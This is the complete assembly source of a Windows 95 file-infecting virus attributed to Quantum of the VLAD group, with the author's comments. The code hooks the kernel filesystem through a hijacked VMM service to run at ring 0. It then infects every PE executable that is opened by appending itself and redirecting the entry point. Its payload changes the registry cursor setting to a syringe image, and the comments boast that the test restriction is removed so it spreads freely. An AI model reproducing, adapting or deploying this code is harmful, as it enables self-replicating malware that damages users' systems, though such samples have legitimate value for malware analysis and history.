;
; Fuck Harry by Quantum / VLAD
; ----------------------------
;
; This is an attempt at a win95 virus without going to all the trouble of a
; "real" virus.  This virus is TSR but does not use a vxd.  As such it is
; less detectable and less technical but it is somewhat more unstable.  Well
; assumably it is cause I havn't found any bugs with it.  The other plus with
; this virus is that it is written in tasm so it is not suprising that it is
; smaller and appears as if it will actually work.
;
; I've put a whole lot of comments into this so hopefully it is easy to
; understand.  To compile it you need the same stuff that you needed to
; compile Bizatch/Boza.
;
; This version (there was two previous ones) has a payload.  It sets the
; default cursor to a syringe.  The effect is not noticable until win95 is
; restarted which gives the virus ample time to spread before people in the
; know recognise the result.
;
; People with brains will notice that the debugging code has been commented
; out in this version.  That is, the virus will infect files other than
; YOYO.EXE.
;
; 2242 bytes.
;

.386
locals
jumps
.model flat,STDCALL
include win32.inc           ; some 32-bit constants and structures

; these are used for dynamic linking.. there is more on this later
IFSMgr_InstallFileSystemApiHook equ db 0cdh,20h,67h,0,40h,0
IFSMgr_Ring0_FileIO equ db 0cdh,20h,32h,0,40h,0
UniToBCSPath equ db 0cdh,20h,41h,0,40h,0
CreateKey equ db 0cdh,20h,4ah,01h,01h,0
SetValueEx equ db 0cdh,20h,52h,01h,01h,0
CloseKey equ db 0cdh,20h,49h,01h,01h,0
ifsah equ 6720cdh
rfio equ 3220cdh
utbp equ 4120cdh
crk equ 014a20cdh
sv equ 015220cdh
clk equ 014920cdh
HKEY_CURRENT_USER equ 80000001h

; these are some includes I lifted from ifs.inc
IFSFN_OPEN  equ 36    ; open file
R0_READFILE equ 0d600h
R0_WRITEFILE equ 0d601h
R0_OPENCREATFILE equ 0d500h
R0_CLOSEFILE equ 0d700h

L equ <LARGE>

;
; Define the external functions we will be linking to
;
extrn            ExitProcess:PROC

.data
db 0,0

copycode:

db 0bdh                        ; mov ebp,delta
delta dd 0

mov edi,0c0001000h             ; start of VMM
mov eax,0ffh                   ; rather than 0 space we shall try ff space
mov ecx,-1
loophere:
repne scasb                    ; search for an 0ffh
mov ebx,ecx
or ecx,ecx
jz weout
cmp edi,0c000c000h
jae weout
rep scasb                      ; see how big the hole is
or ecx,ecx
jz weout
sub ebx,ecx
cmp ebx,100h+offset endcopycode-offset copycode   ; is it big enuff ?
jb loophere
sub edi,ebx
mov eax,0c000157fh             ; read in the pointer to the VMM header
mov ebx,[eax]                  ; read in the VMM marker
cmp dword ptr [ebx+0ch],' MMV' ; make sure it is correct
jnz weout
mov ebx,[ebx+30h]              ; get the address of the functions table
lea eax,[ebx+15*4]             ; get the address to schedule_vm_event
mov [ebp+offset whereto],eax   ; save this address
mov eax,[eax]                  ; get the address of the function
mov [ebp+offset orgoff],eax    ; save the address
lea eax,[edi+offset dynstart-offset copycode] ; get addr of my code
mov [ebx+15*4],eax             ; redirect schedule_vm_event to it
lea esi,[ebp+offset copycode]  ; address of start of code
mov ecx,offset endcopycode-offset copycode  ; size of code
mov [ebp+offset r0delta],edi   ; ring0 delta offset
sub dword ptr [ebp+offset r0delta],offset copycode
mov [ebp+offset r0delta1],edi
sub dword ptr [ebp+offset r0delta1],offset copycode
rep movsb          ; copy it in

weout:

mov [ebp+offset r3seg],cs
jmp $+2
db 0eah                         ; jmp to original code
orgentry dd offset tmpdone
r3seg dw 137h

dynstart:                       ; ring 0 start
pusha
db 0bah                   ; mov edx,r0delta
r0delta dd 0
mov eax,[edx+offset orgoff]     ; reset the original schedule_vm_event pointer
db 0a3h
whereto dd 0
mov [edx+offset r0seg],cs
call initcode                   ; initialize
popa

db 0eah                         ; jmp to original schedule_vm_event
orgoff dd 0
r0seg dw 28h

initcode:
lea eax,[edx+offset filehook]   ; install filesystem api hook
push edx
push eax
fix1:
IFSMgr_InstallFileSystemApiHook
add esp,4
pop edx
mov dword ptr [edx+offset nexthook],eax   ; save the old hook
lea esi,[edx+offset syringename]
push edx
mov eax,R0_OPENCREATFILE                 ; open the file
xor ecx,ecx
mov ebx,2                   ;open in read/write mode
mov edx,12h                 ;create file even if it exists
fix19:
IFSMgr_Ring0_FileIO
pop edx
jc nocreate
xchg ebx,eax
mov eax,R0_WRITEFILE
mov ecx,endsyringe-syringe
lea esi,[edx+offset syringe]
push edx
xor edx,edx
fix20:
IFSMgr_Ring0_FileIO
mov eax,R0_CLOSEFILE
fix21:
IFSMgr_Ring0_FileIO
pop edx

        push    edx
        lea     eax,[edx+offset hkey]
        push    eax
        lea     eax,[edx+offset keyname]
        push    eax
        mov     eax,HKEY_CURRENT_USER
        push    eax
regfix1:
        CreateKey
        add     esp,3*4
        pop     edx

        push    edx
        push    offset endcopycode-offset syringename-1
        lea     eax,[edx+offset syringename]
        push    eax
        push    1           ; reg_sz
        push    0
        lea     eax,[edx+offset subkey]
        push    eax
        mov     eax,[edx+offset hkey]
        push    eax
regfix2:
        SetValueEx
        add     esp,4*6

        pop     edx
        mov     eax,[edx+offset hkey]
        push    eax
regfix3:
        CloseKey
        add     esp,4

nocreate:
ret

filehook:
        push    ebp
        mov     ebp,esp

        sub     esp,20h

        push    ebx
        push    esi
        push    edi

        db      0bfh                   ; mov edi,r0delta1
r0delta1 dd     0

        cmp     byte ptr [edi+offset inuseflag],1  ; so we dont re-enter
        je      okfile

        cmp     dword ptr [ebp+12],IFSFN_OPEN     ; is this an openfile call ?
        jne     okfile

        mov     byte ptr [edi+offset inuseflag],1

        pusha

        ;convert the name to ascii

        lea     esi,[edi+offset namestore]
        mov     eax,[ebp+16]

        cmp     al,0ffh
        je      uncname

        add     al,'@'
        mov     [esi],al
        inc     esi
        mov     byte ptr [esi],':'
        inc     esi
uncname:

        xor     eax,eax
        mov     [edi+offset nthdrsize],eax
        mov     [edi+offset numobjs],eax
        push    eax
        
        mov     eax,255
        push    eax

        mov     ebx,[ebp+28]
        mov     eax,[ebx+12]
        add     eax,4
        push    eax

        mov     eax,esi
        push    eax

fix2:
        UniToBCSPath

        add     esp,4*4

        add     esi,eax
        mov     byte ptr [esi],0        ;add the terminator-z

        ;check the name for .com

        cmp     dword ptr [esi-4],'EXE.'             ; is this a .exe ?
        jne     notexe
;        cmp     dword ptr [esi-8],'OYOY'             ; used in testing
;        jne     notexe

        mov     eax,R0_OPENCREATFILE                 ; open the file
        xor     ecx,ecx
        lea     esi,[edi+offset namestore]
        mov     ebx,2                   ;open in read/write mode
        mov     edx,1                   ;open file if it exists
fix3:
        IFSMgr_Ring0_FileIO
        jc      notexe

        mov     ebx,eax                 ;ebx = file handle

        mov     ecx,4          ; read in the secondary header offset
        mov     edx,3ch
        mov     eax,R0_READFILE
        lea     esi,[edi+offset peheaderoff]
fix4:
        IFSMgr_Ring0_FileIO

        mov     ecx,4                          ; read in the header type
        mov     edx,[edi+offset peheaderoff]
        mov     eax,R0_READFILE
        lea     esi,[edi+offset namestore]
fix5:
        IFSMgr_Ring0_FileIO

        cmp     dword ptr [esi],00004550h     ; make sure it is a pe
        jnz     weout1

        mov     ecx,4                   ;read image base
        mov     edx,[edi+offset peheaderoff]
        add     edx,52
        mov     eax,R0_READFILE
        lea     esi,[edi+offset imagebase]
fix6:
        IFSMgr_Ring0_FileIO

        mov     ecx,4                   ; read entry point
        mov     edx,[edi+offset peheaderoff]
        add     edx,40
        mov     eax,R0_READFILE
        lea     esi,[edi+offset orgentry]
fix7:
        IFSMgr_Ring0_FileIO


        mov     eax,[edi+offset imagebase]
        add     [edi+offset orgentry],eax ; store imagebase + entrypoint

        mov     ecx,4                     ; read in object align
        mov     edx,[edi+offset peheaderoff]
        add     edx,56
        lea     esi,[edi+offset objalign]
        mov     eax,R0_READFILE
fix8:
        IFSMgr_Ring0_FileIO

        mov     ecx,4                     ; read in file align
        mov     edx,[edi+offset peheaderoff]
        add     edx,60
        lea     esi,[edi+offset filealign]
        mov     eax,R0_READFILE
fix9:
        IFSMgr_Ring0_FileIO

        mov     ecx,2                   ; read nthdr size
        mov     edx,[edi+offset peheaderoff]
        add     edx,20
        mov     eax,R0_READFILE
        lea     esi,[edi+offset nthdrsize]
fix10:
        IFSMgr_Ring0_FileIO

        mov     ecx,2                   ; read number of objects
        mov     edx,[edi+offset peheaderoff]
        add     edx,6
        mov     eax,R0_READFILE
        lea     esi,[edi+offset numobjs]
fix11:
        IFSMgr_Ring0_FileIO

        mov     eax,[esi]
        mov     ecx,40                  ; read in last object
        mul     ecx
        mov     edx,[edi+offset nthdrsize]
        add     edx,eax
        sub     edx,ecx
        add     edx,[edi+offset peheaderoff]
        add     edx,24
        mov     [edi+offset objoff],edx
        mov     eax,R0_READFILE
        lea     esi,[edi+offset lastobj]
fix12:
        IFSMgr_Ring0_FileIO

        cmp     byte ptr [edi+offset lastobj+7],0ffh
        jz      weout1
        mov     byte ptr [edi+offset lastobj+7],0ffh

        mov     eax,[edi+offset lastobj+8]        ; calculate entrypoint
        add     eax,[edi+offset lastobj+12]
        mov     [edi+offset newentry],eax
        add     eax,[edi+offset imagebase]
        sub     eax,offset copycode               ; calculate delta offset
        mov     [edi+offset delta],eax

        xor     edx,edx                           ; update physical size
        mov     eax,endcopycode-copycode
        mov     ecx,[edi+offset filealign]
        div     ecx
        inc     eax
        mul     ecx
        push    eax
        add     eax,[edi+offset lastobj+8]
        mov     [edi+offset lastobj+16],eax

        xor     edx,edx                           ; update virtual size
        mov     eax,endcopycode-copycode
        mov     ecx,[edi+offset objalign]
        div     ecx
        inc     eax
        mul     ecx
        push    eax
        add     eax,[edi+offset lastobj+8]
        mov     [edi+offset lastobj+8],eax

        mov     eax,[edi+offset lastobj+8]        ; update imagesize
        add     eax,[edi+offset lastobj+12]
        mov     [edi+offset imagesize],eax

        mov     [edi+offset lastobj+36],0e0000040h ; set the object flags

        mov     ecx,4                              ; write the imagesize
        mov     edx,[edi+offset peheaderoff]
        add     edx,80
        mov     eax,R0_WRITEFILE
        lea     esi,[edi+offset imagesize]
fix14:
        IFSMgr_Ring0_FileIO

        mov     ecx,40                             ; write the object
        mov     edx,[edi+offset objoff]
        mov     eax,R0_WRITEFILE
        lea     esi,[edi+offset lastobj]
fix15:
        IFSMgr_Ring0_FileIO

; code in a vxd that looks like "VxDCall IFSMgr_Ring0_FileIO" is compiled with
; masm it is converted to an int 20 followed by a function number and then by
; a vxd number.  Thus to avoid the use of masm I have used EQU's.

; When the int 20 is executed it is turned into a call to a ring 0 function.
; This code sets the changed functions back to the dynamic int 20 code so this
; code will be marginally compatible with future versions and initilization
; orders of win95.

        mov     cx,40h

        mov     dword ptr [edi+offset fix1],ifsah
        mov     word ptr [edi+offset fix1+4],cx
        mov     dword ptr [edi+offset fix2],utbp
        mov     word ptr [edi+offset fix2+4],cx

        mov     cx,1
        mov     dword ptr [edi+offset regfix1],crk
        mov     word ptr [edi+offset regfix1+4],cx
        mov     dword ptr [edi+offset regfix2],sv
        mov     word ptr [edi+offset regfix2+4],cx
        mov     dword ptr [edi+offset regfix3],clk
        mov     word ptr [edi+offset regfix3+4],cx

	lea	esi,[edi+offset fixlist]
        mov     ecx,18
dolist:
	lodsd
	add	eax,edi
	mov	dword ptr [eax],rfio
	mov	word ptr [eax+4],40h
	loop	dolist

        pop     ecx                    ; write the copycode to the exe
        mov     eax,R0_WRITEFILE
        mov     edx,[edi+offset lastobj+8]
        add     edx,[edi+offset lastobj+20]
        sub     edx,ecx
        pop     ecx
        lea     esi,[edi+offset copycode]
fix16:
        IFSMgr_Ring0_FileIO

        mov     ecx,4                   ; write the new entrypoint
        mov     edx,[edi+offset peheaderoff]
        add     edx,40
        mov     eax,R0_WRITEFILE
        lea     esi,[edi+offset newentry]
fix17:
        IFSMgr_Ring0_FileIO

weout1:

        mov     eax,R0_CLOSEFILE        ;close file
fix18:
        IFSMgr_Ring0_FileIO
        
notexe:

        popa

        mov     byte ptr [edi+offset inuseflag],0 ; set flag off

okfile:

        mov     eax,[ebp+28]         ; call the old hooker
        push    eax
        mov     eax,[ebp+24]
        push    eax
        mov     eax,[ebp+20]
        push    eax
        mov     eax,[ebp+16]
        push    eax
        mov     eax,[ebp+12]
        push    eax
        mov     eax,[ebp+8]
        push    eax

        db      0b8h
nexthook dd 0
        call    [eax]

        add     esp,6*4

        pop     edi
        pop     esi
        pop     ebx

        leave
        ret


db "Fuck Harry by Quantum / VLAD",0

fixlist dd offset fix3
	dd offset fix4
	dd offset fix5
	dd offset fix6
	dd offset fix7
	dd offset fix8
	dd offset fix9
	dd offset fix10
	dd offset fix11
	dd offset fix12
	dd offset fix14
	dd offset fix15
	dd offset fix16
	dd offset fix17
	dd offset fix18
        dd offset fix19
        dd offset fix20
        dd offset fix21

keyname db "\Control Panel\Cursors",0
subkey db "Arrow",0
include syringe.inc
endcopycode:
inuseflag db 0
hkey dd 0
newentry dd 0
peheaderoff dd 0
imagebase dd 0
objalign dd 0
filealign dd 0
nthdrsize dd 0
numobjs dd 0
objoff dd 0
imagesize dd 0
lastobj db 40 dup (0)

namestore:

.code
;-----------------------------------------------------------------------------
;
; This is where control is received from the loader.
;
start:

mov eax,endcopycode-copycode      ; just so ya can see the size :)
jmp copycode

tmpdone:
push 0
call ExitProcess

ends
end start

